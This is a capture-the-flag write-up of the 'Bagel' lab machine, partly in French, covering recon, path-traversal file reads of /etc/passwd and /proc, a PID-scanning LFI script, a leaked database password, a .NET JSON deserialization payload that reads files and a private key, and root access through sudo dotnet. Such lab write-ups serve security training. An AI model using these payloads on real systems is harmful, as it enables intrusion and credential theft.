\chapter{Bagel}
\begin{itemize}
    \item {\bf technics}: LFI, insecure deserialization, .net, dotnet fsi
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Recon}
\subsection{nmap}
\begin{verbatim}
$ nmapz 10.129.65.53
ports found: 22,5000,8000
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-21 14:42 CET
Nmap scan report for 10.129.65.53
Host is up (0.037s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.8 (protocol 2.0)
| ssh-hostkey:
|   256 6e4e1341f2fed9e0f7275bededcc68c2 (ECDSA)
|_  256 80a7cd10e72fdb958b869b1b20652a98 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Tue, 21 Feb 2023 13:43:14 GMT
|     Connection: close
|   HTTPOptions:
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Tue, 21 Feb 2023 13:43:30 GMT
|     Connection: close
|   Help, SSLSessionReq:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Tue, 21 Feb 2023 13:43:40 GMT
|     Content-Length: 52
|     Connection: close
|     Keep-Alive: true
|     <h1>Bad Request (Invalid request line (parts).)</h1>
|   RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Tue, 21 Feb 2023 13:43:14 GMT
|     Content-Length: 54
|     Connection: close
|     Keep-Alive: true
|     <h1>Bad Request (Invalid request line (version).)</h1>
|   TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Tue, 21 Feb 2023 13:43:41 GMT
|     Content-Length: 52
|     Connection: close
|     Keep-Alive: true
|_    <h1>Bad Request (Invalid request line (parts).)</h1>
8000/tcp open  http-alt Werkzeug/2.2.2 Python/3.10.9
|_http-title: Did not follow redirect to http://bagel.htb:8000/?page=index.html
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.2.2 Python/3.10.9
|     Date: Tue, 21 Feb 2023 13:43:15 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest:
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.2.2 Python/3.10.9
|     Date: Tue, 21 Feb 2023 13:43:09 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 263
|     Location: http://bagel.htb:8000/?page=index.html
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://bagel.htb:8000/?page=index.html">http://bagel.htb:8000/?page=index.html</a>. If not, click the link.
|   Socks5:
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('
|     ').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-server-header: Werkzeug/2.2.2 Python/3.10.9


$ sudo nmap -sU -T4 10.129.65.53
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-21 14:57 CET
Warning: 10.129.65.53 giving up on port because retransmission cap hit (6).
Nmap scan report for bagle.htb (10.129.65.53)
Host is up (0.027s latency).
Not shown: 987 closed udp ports (port-unreach)
PORT      STATE         SERVICE
17/udp    open|filtered qotd
997/udp   open|filtered maitrd
1804/udp  open|filtered enl
2000/udp  open|filtered cisco-sccp
3659/udp  open|filtered apple-sasl
5060/udp  open|filtered sip
16779/udp open|filtered unknown
17823/udp open|filtered unknown
19605/udp open|filtered unknown
21621/udp open|filtered unknown
24279/udp open|filtered unknown
32385/udp open|filtered unknown
51456/udp open|filtered unknown

\end{verbatim}





\subsection{port 5000}
\begin{verbatim}
$ curl -i http://bagle.htb:5000
HTTP/1.1 400 Bad Request
Server: Microsoft-NetCore/2.0
Date: Tue, 21 Feb 2023 14:34:41 GMT
Connection: close
Transfer-Encoding: chunkedea
\end{verbatim}



\subsection{port 8000}

\begin{verbatim}
$ curl -i http://bagle.htb:8000
HTTP/1.1 302 FOUND
Server: Werkzeug/2.2.2 Python/3.10.9
Date: Tue, 21 Feb 2023 14:37:45 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 263
Location: http://bagel.htb:8000/?page=index.html
Connection: close

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="http://bagel.htb:8000/?page=index.html">http://bagel.htb:8000/?page=index.html</a>. If not, click the link.

$ curl -i http://bagle.htb:8000/?page=test.html
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.10.9
Date: Tue, 21 Feb 2023 14:40:42 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 14
Connection: close

File not found
\end{verbatim}


\begin{verbatim}

 :: Method           : GET
 :: URL              : http://bagle.htb:8000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Extensions       : html
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 14
[Status: 200, Size: 267, Words: 36, Lines: 4, Duration: 511ms]
    * FUZZ: orders

$ curl -i http://bagle.htb:8000/orders
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.10.9
Date: Tue, 21 Feb 2023 14:46:20 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 267
Connection: close

order #1 address: NY. 99 Wall St., client name: P.Morgan, details: [20 chocko-bagels]
order #2 address: Berlin. 339 Landsberger.A., client name: J.Smith, details: [50 bagels]
order #3 address: Warsaw. 437 Radomska., client name: A.Kowalska, details: [93 bel-bagels]

________________________________________________

 :: Method           : GET
 :: URL              : http://bagle.htb:8000/?FUZZ=orders
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Extensions       : .html
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 263
________________________________________________

[Status: 200, Size: 14, Words: 3, Lines: 1, Duration: 38ms]
    * FUZZ: page

\end{verbatim}

\begin{verbatim}
$ curl -i http://bagle.htb:8000/?page=../../../../etc/passwd
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.10.9
Date: Wed, 22 Feb 2023 01:03:59 GMT
Content-Disposition: inline; filename=passwd
Content-Type: application/octet-stream
Content-Length: 1823
Last-Modified: Wed, 25 Jan 2023 12:44:39 GMT
Cache-Control: no-cache
ETag: "1674650679.4629574-1823-2785087565"
Date: Wed, 22 Feb 2023 01:03:59 GMT
Connection: close

root:x:0:0:root:/root:/bin/bash
...SNIP...
developer:x:1000:1000::/home/developer:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
...SNIP...

$ curl -i http://bagle.htb:8000/?page=../../../../proc/self/status
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.10.9
Date: Wed, 22 Feb 2023 01:11:37 GMT
Content-Disposition: inline; filename=status
Content-Type: application/octet-stream
Content-Length: 1407
Last-Modified: Tue, 21 Feb 2023 16:30:05 GMT
Cache-Control: no-cache
ETag: "1676997005.4988964-0-266539696"
Date: Wed, 22 Feb 2023 01:11:37 GMT
Connection: close

Name:   python3
Umask:  0022
State:  S (sleeping)
Tgid:   891
Ngid:   0
Pid:    891
PPid:   1

$ curl -i http://bagle.htb:8000/?page=../../../../../proc/self/cmdline
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.10.9
Date: Wed, 22 Feb 2023 01:19:34 GMT
Content-Disposition: inline; filename=cmdline
Content-Type: application/octet-stream
Content-Length: 35
Last-Modified: Tue, 21 Feb 2023 16:30:05 GMT
Cache-Control: no-cache
ETag: "1676997005.4988964-0-1365185395"
Date: Wed, 22 Feb 2023 01:19:34 GMT
Connection: close

Warning: Binary output can mess up your terminal. Use "--output -" to tell
Warning: curl to output it to your terminal anyway, or consider "--output
Warning: <FILE>" to save to a file.


$ curl -s -i --output cmdline http://bagle.htb:8000/?page=../../../../../proc/self/cmdline
$ cat cmdline
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.10.9
Date: Wed, 22 Feb 2023 01:21:11 GMT
Content-Disposition: inline; filename=cmdline
Content-Type: application/octet-stream
Content-Length: 35
Last-Modified: Tue, 21 Feb 2023 16:30:05 GMT
Cache-Control: no-cache
ETag: "1676997005.4988964-0-1365185395"
Date: Wed, 22 Feb 2023 01:21:11 GMT
Connection: close

python3/home/developer/app/app.py

$ curl http://bagle.htb:8000/?page=../../../../home/developer/app/app.py
from flask import Flask, request, send_file, redirect, Response
import os.path
import websocket,json

app = Flask(__name__)

@app.route('/')
def index():
        if 'page' in request.args:
            page = 'static/'+request.args.get('page')
            if os.path.isfile(page):
                resp=send_file(page)
                resp.direct_passthrough = False
                if os.path.getsize(page) == 0:
                    resp.headers["Content-Length"]=str(len(resp.get_data()))
                return resp
            else:
                return "File not found"
        else:
                return redirect('http://bagel.htb:8000/?page=index.html', code=302)

@app.route('/orders')
def order(): # don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.
    try:
        ws = websocket.WebSocket()
        ws.connect("ws://127.0.0.1:5000/") # connect to order app
        order = {"ReadOrder":"orders.txt"}
        data = str(json.dumps(order))
        ws.send(data)
        result = ws.recv()
        return(json.loads(result)['ReadOrder'])
    except:
        return("Unable to connect")

if __name__ == '__main__':
  app.run(host='0.0.0.0', port=8000)

\end{verbatim}

\begin{verbatim}
$ cat exploits/test.py
import requests

def list_cmd_lines():
    for pid in range(1, 65536):
        if pid % 100 == 0:
            print(pid)
        r = requests.get(f'http://bagle.htb:8000/?page=../../../../../proc/{pid}/cmdline')
        if r.text and r.text != 'File not found':
            print(r.text)

list_cmd_lines()

$ python exploits/test.py
/usr/lib/systemd/systemdrhgb--switched-root--system--deserialize35
100
...SNIP...
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
...SNIP...
\end{verbatim}


\begin{verbatim}
$ curl -s --output bagle.dll http://bagle.htb:8000/?page=../../../../..//opt/bagel/bin/Debug/net6.0/bagel.dll

\end{verbatim}


\begin{verbatim}
$ cat DB.cs |grep Password
string text = "Data Source=ip;Initial Catalog=Orders;User ID=dev;Password=k8wdAYYKyhnjg3K";
\end{verbatim}

\begin{verbatim}
 ssh developer@bagle.htb
The authenticity of host 'bagle.htb (10.129.200.158)' can't be established.
ED25519 key fingerprint is SHA256:Di9rfN6auXa0i6Hdly0dzrLddlFqLIfzbUn30m/l7cg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'bagle.htb' (ED25519) to the list of known hosts.
developer@bagle.htb: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
\end{verbatim}



\begin{verbatim}
 private static void MessageReceived(object sender, MessageReceivedEventArgs args)
{
        string json = "";
        bool flag = args.Data != null && args.Data.Count > 0;
        if (flag)
        {
                json = Encoding.UTF8.GetString(args.Data.Array, 0, args.Data.Count);
        }
        Handler handler = new Handler();
        object obj = handler.Deserialize(json);
        object obj2 = handler.Serialize(obj);
        Bagel._Server.SendAsync(args.IpPort, obj2.ToString(), default(CancellationToken));
}
\end{verbatim}

\begin{verbatim}
{
        result = JsonConvert.DeserializeObject<Base>(json, new JsonSerializerSet

        {
                TypeNameHandling = 4
        });
}
\end{verbatim}

\begin{verbatim}
Auto	4	Include the .NET type name when the type of the object being
serialized is not the same as its declared type. Note that this doesn't include
the root serialized object by default. To include the root object's type name
in JSON you must specify a root type object with SerializeObject(Object, Type,
JsonSerializerSettings) or Serialize(JsonWriter, Object, Type). 

Remarks
TypeNameHandling should be used with caution when your application deserializes
JSON from an external source. Incoming types should be validated with a custom
SerializationBinder when deserializing with a value other than None. 
\end{verbatim}

la class \verb+File+ serait exploitable

le truc dans la class Order c'est la méthode \verb+RemoveOrder+ qui retourne un
object.

\url{https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf}


Donc a priori le format du type 
\verb+<fully qualified name of the type>,<assembly name>+

\begin{verbatim}
order = {"RemoveOrder": {"$type": "bagel_server.File,bagel", "ReadFile":"../../../../../etc/passwd"}}
\end{verbatim}


et donc on recup la clé de phil

\section{Foothold}
\subsection{Phil}

rien a priori

par contre on peu switch ver developper

\subsection{developer}

\begin{verbatim}
[phil@bagel ~]$ su developer
Password:
[developer@bagel phil]$ sudo -l
Matching Defaults entries for developer on bagel:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR
    LS_COLORS", env_keep+="MAIL QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/var/lib/snapd/snap/bin

User developer may run the following commands on bagel:
    (root) NOPASSWD: /usr/bin/dotnet

\end{verbatim}

on peut donc lancer la console interactive en tant que root et au mini lire le
flag.
